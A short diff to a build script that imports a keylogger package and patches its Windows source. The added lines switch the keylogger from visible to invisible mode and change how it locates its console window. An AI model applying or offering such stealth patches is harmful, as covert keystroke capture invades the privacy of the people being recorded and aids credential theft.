@@ -16,3 +16,14 @@ dk_validate		(ENV{DKIMPORTS_DIR} "dk_DKIMPORTS_DIR()")
 dk_getFileParam	("$ENV{DKIMPORTS_DIR}/keylogger/dkconfig.txt" KEYLOGGER_IMPORT)
 
 dk_import		(${KEYLOGGER_IMPORT})
+
+
+dk_fileReplace("${KEYLOGGER}/windows/klog_main.cpp" 
+	"#define visible"
+	"#define invisible"
+)
+
+dk_fileReplace("${KEYLOGGER}/windows/klog_main.cpp" 
+	"FindWindowA(\"ConsoleWindowClass\", NULL)"
+	"GetConsoleWindow()"
+)
